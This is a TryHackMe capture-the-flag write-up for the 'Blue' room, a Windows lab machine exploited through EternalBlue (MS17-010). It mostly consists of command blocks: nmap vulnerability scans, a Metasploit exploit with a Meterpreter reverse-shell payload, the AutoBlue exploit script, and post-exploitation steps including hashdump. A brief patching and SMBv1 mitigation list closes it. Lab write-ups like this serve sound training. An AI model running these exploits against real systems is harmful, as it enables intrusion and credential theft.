---
title: "Blue - TryHackMe"
description: "Writeup for Blue, a Windows machine vulnerable to EternalBlue (MS17-010)."
pubDate: 2024-10-14
platform: "tryhackme"
category: "rooms"
difficulty: "easy"
os: "windows"
language: en
tags: ["eternalblue", "ms17-010", "smb"]
retired: false
heroImage: "/images/writeups/tryhackme/blue.jpg"
---

# Blue - TryHackMe Writeup

**Difficulty**: Easy  
**OS**: Windows  
**Platform**: TryHackMe

## Reconnaissance

```bash
nmap -sV -vv --script vuln 10.10.10.40
```

**Vulnerability found:**
- MS17-010 (EternalBlue)

## SMB Enumeration

```bash
nmap -p 445 --script=smb-vuln-ms17-010 10.10.10.40
```

The system is vulnerable to **EternalBlue**.

## Exploitation

### Method 1: Metasploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST tun0
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

### Method 2: AutoBlue

```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010
pip install -r requirements.txt

# Generate shellcode
cd shellcode
./shell_prep.sh

# Run exploit
cd ../
python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_x64.bin
```

## Post-Exploitation

Once inside with Meterpreter:

```bash
# Get system
getsystem

# Hash dump
hashdump

# Migrate process
ps
migrate <PID>

# Search flags
search -f flag*.txt
```

**Flag locations:**
- `C:\flag1.txt`
- `C:\Windows\System32\config\flag2.txt`
- `C:\Users\Jon\Documents\flag3.txt`

## Mitigation

1. Apply MS17-010 patch
2. Disable SMBv1
3. Implement network segmentation
4. Keep systems updated

## Conclusion

EternalBlue was one of the most devastating vulnerabilities, used in attacks like WannaCry. This machine teaches:

- Importance of security patches
- Danger of SMBv1
- Post-exploitation techniques on Windows
